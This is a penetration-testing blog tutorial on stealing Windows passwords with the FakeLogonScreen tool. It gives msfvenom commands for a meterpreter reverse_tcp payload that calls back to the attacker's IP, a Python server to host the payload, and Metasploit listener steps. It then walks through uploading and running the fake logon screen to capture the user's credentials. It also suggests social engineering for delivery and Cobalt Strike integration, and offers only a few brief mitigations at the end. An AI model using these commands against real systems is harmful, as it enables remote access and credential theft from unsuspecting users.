<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Steal Windows Password using FakeLogonScreen</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/steal-windows-password-using-fakelogonscreen/" rel="bookmark"><time class="entry-date published" datetime="2020-02-13T13:06:03+00:00">February 13, 2020</time><time class="updated" datetime="2025-06-06T08:25:21+00:00">June 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we are going to focus on a tool that caught my attention. FakeLogonScreen is a tool that creates a fake Windows Logon Screen and then forces the user to enter the correct credentials and then relay the credentials to the attacker. It can work in different scenarios.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">FakeLogonScreen tool was developed by <a style="color: #000000;" href="https://twitter.com/bitsadmin">Arris Huijgen</a>. I have already talked about the working of the tool. It doesn’t do much other than that.  To better understand the working of this tool, I will be performing a practical on the said tool using the systems configured as depicted.</span></p>
<p class="ai-optimize-8"><span style="color: #000000;">Download the executables for the practical by clicking <strong><a style="color: #000000;" href="https://github.com/bitsadmin/fakelogonscreen/releases">here</a></strong>.</span></p>
<h3 class="ai-optimize-9"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Configurations used in Practical</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Scenario</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Payload Creation</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Starting Listener</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Uploading the FakeLogonScreen Executable</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Credentials Entering on Target Side</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Grabbing the Credentials</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Additional Information</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Mitigations</span></li>
</ul>
<h3 class="ai-optimize-19"><span style="color: #800000;">Configurations used in Practical</span></h3>
<p class="ai-optimize-20"><span style="color: #000000;"><strong>Attacker:</strong></span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>    OS:</strong> Kali Linux 2020.1</span></p>
<p class="ai-optimize-22"><span style="color: #000000;"><strong>    IP: </strong>192.168.1.13</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><strong>Target:</strong></span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><strong>    OS:</strong> Windows 10 (Build 18363)</span></p>
<p class="ai-optimize-25"><span style="color: #000000;"><strong>    IP:</strong> 192.168.1.11</span></p>
<h4 class="ai-optimize-26"><span style="color: #000000;">Scenario </span></h4>
<p class="ai-optimize-27"><span style="color: #000000;">A system connects to the same network as the attacker, and the attacker hunts for the credentials of the Target System. The Information that the target already has is the IP Address and the knowledge of the OS system. This kind of information is quite easy to get by.</span></p>
<h4 class="ai-optimize-28"><span style="color: #000000;">Payload Creation</span></h4>
<p class="ai-optimize-29"><span style="color: #000000;">Now, to get started, I used the msfvenom tool to craft a payload according to the OS of my Target System. I provided my Kali’s IP Address as the LHOST. Since the target machine ran Windows, I created my payload as an executable file that anyone can execute easily. After crafting the payload, I ran a Python One-liner to create an HTTP server which will host the payload at the port 80 of the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.233.128 lport=4444 -f exe &gt;&gt; payload.exe
python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-30"><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-VlGWhrAJWaA/XkVIhy6mJ-I/AAAAAAAAiqc/kV9bxccVpQcyUveUZxfxNQbYXG9CLxTbwCLcBGAsYHQ/s1600/1.png" alt="FakeLogonScreen Attack" width="906" height="151"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">Now in a real-life scenario, the attacker will use some kind of Social Engineering Attack to manipulate the target user to download this malicious payload on their system. This can be done long before performing the actual attack.</span></p>
<h4 class="ai-optimize-32"><span style="color: #000000;">Starting Listener</span></h4>
<p class="ai-optimize-33"><span style="color: #000000;">Since we have our payload ready and hosted. Now we need to start a listener where we will receive our session from the payload. After setting up the proper configuration, I went straight up to the Target Machine and executed the payload. Again, this is a lab environment demonstration. Real-Life Scenarios will vary. </span></p>
<h4 class="ai-optimize-34"><span style="color: #000000;">Uploading the FakeLogonScreen Executable</span></h4>
<p class="ai-optimize-35"><span style="color: #000000;">After getting the meterpreter session, we upload the FakeLogonScreen.exe to the Target System. This executable can be found in the directory that is cloned. After successful upload, we get onto the command line of the target machine using the shell command. Now we run the executable as shown in the image given.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.233.128
set lport 4444
run
upload FakeLogonScreen.exe
shell
FakeLogonScreen.exe</pre>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AhwYKe4KaOY/XkVIiADvF5I/AAAAAAAAiqg/_Lp_VckUAT0QeLQl6ARhPn9aMFQQ7dNjQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3 class="ai-optimize-37"><span style="color: #800000;">Credentials Entering on Target Side</span></h3>
<p class="ai-optimize-38"><span style="color: #000000;">As soon as we ran the executable through the shell, all the current windows on the Target System get minimized and a login screen pops up as shown in the image given. This seems a pretty real logon screen. The target user assumes that there must be an accidental log off. So, to assume his/her work, the target user unknowingly enters the credentials.</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-rl3LBWC8Le4/XkVIieInM0I/AAAAAAAAiqk/oP9njmDjyBMS4DMl_jiLtE6gFrF8S42mQCLcBGAsYHQ/s1600/3.png" alt="FakeLogonScreen Attack" width="512" height="642"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">Now to demonstrate that the password is checked, we first entered the wrong credentials. The Logon Screen gave back an error “The password is incorrect. Try again”. This proves that the target user has to enter the valid credentials to get through.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zenZFVEMQkU/XkVIixGlkdI/AAAAAAAAiqo/akINf0-4fwUbUaeMb4xVEpphK41kKssIgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">Next, we entered the valid credentials and we see that all the minimized windows are restored back to the way they were.</span></p>
<h3 class="ai-optimize-43"><span style="color: #800000;">Grabbing the Credentials</span></h3>
<p class="ai-optimize-44"><span style="color: #000000;">Let’s head back to our attacker machine to see if we were able to grab those passwords. As shown in the image given below, we see that the FakeLogonScreen listener works similar to a key logger. We first entered the “wrong password” in the password field to check the false cases. Then we entered the correct password “123” and we successfully grabbed the password for the target user.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-rZcvC7fT7xk/XkVIiz0BwcI/AAAAAAAAiqs/lDjHk79C8gk-1xtEDhgv7DiI0R513gA3QCLcBGAsYHQ/s1600/5.png" alt="FakeLogonScreen Attack" width="452" height="487"/></span></p>
<h3 class="ai-optimize-46"><span style="color: #800000;">Additional Information</span></h3>
<p class="ai-optimize-47"><span style="color: #000000;">I contacted the author of this tool to find out how effective this tool works in multiple desktop setups. When executed in multiple desktop setups, all the other desktop screen turns black. Also if the target user has configured a customized background, then the system shows that customized background. This is a plus point in an office environment as those systems have a custom company image for Logon Screen.</span></p>
<p class="ai-optimize-48"><span style="color: #000000;">We also have another executable in the zip file we downloaded earlier. It is named “FakeLogonScreenToFile.exe”. This file works in a similar way but along-with displaying the password, it stores the password at the following location:</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">%LOCALAPPDATA%\Microsoft\user.db</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">This tool also works on Windows 7. Although it has reached its EOL still there are a huge number of systems that are running Windows 7 on the Production. If required, you can find it inside the “DOTNET35” directory.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">You can also integrate this tool to work with Cobalt Strike. Check out <strong><a style="color: #000000;" href="https://raw.githubusercontent.com/bitsadmin/fakelogonscreen/master/demo.gif">here</a></strong>.</span></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Mitigations</span></h3>
<ul>
<li class="ai-optimize-53"><span style="color: #000000;">Verify Download Sources.</span></li>
<li class="ai-optimize-54"><span style="color: #000000;">Monitor the AppData Directory for the user.db file.</span></li>
<li class="ai-optimize-55"><span style="color: #000000;">Properly check all the links in the Logon Screen.</span></li>
<li class="ai-optimize-56"><span style="color: #000000;">Implement a Password Change Policy of a shorter duration.</span></li>
</ul>
<p class="ai-optimize-55"><span style="color: #000000;">To learn more about Penteration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
<p class="ai-optimize-57"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <strong>Twitter </strong>and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
